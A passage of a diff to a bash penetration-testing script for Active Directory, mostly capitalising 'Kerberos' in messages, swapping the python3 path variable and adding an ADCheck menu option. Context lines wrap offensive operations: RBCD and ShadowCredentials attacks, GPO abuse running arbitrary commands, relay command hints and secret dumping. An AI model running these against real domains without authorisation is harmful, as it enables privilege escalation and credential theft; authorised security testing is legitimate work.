         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"           
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"           
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] Adding new computer account. Please specify computer hostname (default: WS3000):${NC}"
@@ -2460,7 +2488,7 @@ dnsentry_add () {
     else
         mkdir -p ${output_dir}/Modification/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"          
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"          
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             echo -e "${BLUE}[*] Please specify hostname of the attacker DNS entry (default: kali):${NC}"
@@ -2482,7 +2510,7 @@ change_owner () {
     else
         mkdir -p ${output_dir}/Modification/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"           
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"           
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] Changing owner of a user or computer account. Please specify target:${NC}"
@@ -2520,7 +2548,7 @@ rbcd_attack () {
     else
         mkdir -p ${output_dir}/Modification/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"       
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"       
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] Performing RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
@@ -2556,7 +2584,7 @@ shadowcreds_attack () {
     else
         mkdir -p ${output_dir}/Modification/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"          
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"          
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target (add $ if computer account):${NC}"
@@ -2577,7 +2605,7 @@ pygpo_abuse () {
     if [ ! -f "${pygpoabuse}" ]; then
         echo -e "${RED}[-] Please verify the installation of pygpoabuse${NC}"
     elif [ "${nullsess_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-        echo -e "${PURPLE}[-] pygpoabuse requires credentials and does not support kerberos authentication using AES Key${NC}"
+        echo -e "${PURPLE}[-] pygpoabuse requires credentials and does not support Kerberos authentication using AES Key${NC}"
     else
         echo -e "${BLUE}[*] Using modification rights on GPO to execute command. Please specify GPO ID${NC}"
         target_gpoabuse=""
@@ -2598,7 +2626,7 @@ pygpo_abuse () {
         read -p ">> " command_input_gpoabuse </dev/tty
         if [ ! "${command_input_gpoabuse}" == "" ] ; then command_gpoabuse="-command ${command_input_gpoabuse}"; fi
         if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi            
-        run_command "$(which python3) ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a ${output_dir}/Modification/pygpoabuse_output.txt
+        run_command "${python3} ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a ${output_dir}/Modification/pygpoabuse_output.txt
     fi
     echo -e ""
 }
@@ -2609,7 +2637,7 @@ add_unconstrained () {
     else
         mkdir -p ${output_dir}/Modification/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"          
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"          
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] Adding Unconstrained Delegation rights on owned account. Please specify target:${NC}"
@@ -2632,7 +2660,7 @@ add_spn () {
     else
         mkdir -p ${output_dir}/Modification/bloodyAD
         if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support kerberos authentication using AES Key${NC}"          
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"          
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
             echo -e "${BLUE}[*] Adding CIFS and HTTP SPNs to owned computer account. Please specify target:${NC}"
@@ -2648,7 +2676,7 @@ add_spn () {
             if [[ $(grep -a "has been updated" ${output_dir}/Modification/bloodyAD/bloodyad_out_spn_${dc_domain}.txt 2>/dev/null) ]]; then
                 echo -e "${GREEN}[+] Adding CIFS and HTTP SPNs successful! Run command below to perform Kerberos relay attack${NC}"
                 echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l ${target_spn}.${domain} --dc-ip $dc_ip"
-                echo -e "$(which python3) krbrelayx-master/krbrelayx.py -hashes :< NTLM hash of computer account >"
+                echo -e "${python3} krbrelayx-master/krbrelayx.py -hashes :< NTLM hash of computer account >"
             fi 
        fi
     fi
@@ -2911,7 +2939,7 @@ hekatomb_dump () {
     else
         echo -e "${BLUE}[*] Dumping secrets using hekatomb${NC}"
         if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] hekatomb requires credentials and does not support kerberos authentication${NC}"
+            echo -e "${PURPLE}[-] hekatomb requires credentials and does not support Kerberos authentication${NC}"
         else
             current_dir=$(pwd)
             cd ${output_dir}/Credentials
@@ -3301,6 +3329,7 @@ ad_menu() {
     echo -e "24) Open LDAPPER custom options"
     echo -e "25) Run adPEAS enumerations"
     echo -e "26) Open breads console"
+    echo -e "27) Run ADCheck enumerations"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3413,6 +3442,10 @@ ad_menu() {
 
         26)
         breads_console
+        ad_menu;;
+
+        27)
+        adcheck_enum
         ad_menu;;
 
         back)
@@ -4721,6 +4754,8 @@ config_menu () {
         if [ ! -x "${RunFinger}" ] ; then echo -e "${RED}[-] RunFinger is not executable${NC}"; else echo -e "${GREEN}[+] RunFinger is executable${NC}"; fi
         if [ ! -f "${adPEAS}" ] ; then echo -e "${RED}[-] adPEAS is not installed${NC}"; else echo -e "${GREEN}[+] adPEAS is installed${NC}"; fi
         if [ ! -f "${breads}" ] ; then echo -e "${RED}[-] breads is not installed${NC}"; else echo -e "${GREEN}[+] breads is installed${NC}"; fi
+        if [ ! -f "${ADCheck}" ] ; then echo -e "${RED}[-] ADCheck is not installed${NC}"; else echo -e "${GREEN}[+] ADCheck is installed${NC}"; fi
+        if [ ! -x "${ADCheck}" ] ; then echo -e "${RED}[-] ADCheck is not executable${NC}"; else echo -e "${GREEN}[+] ADCheck is executable${NC}"; fi
         config_menu;;
 
         2)
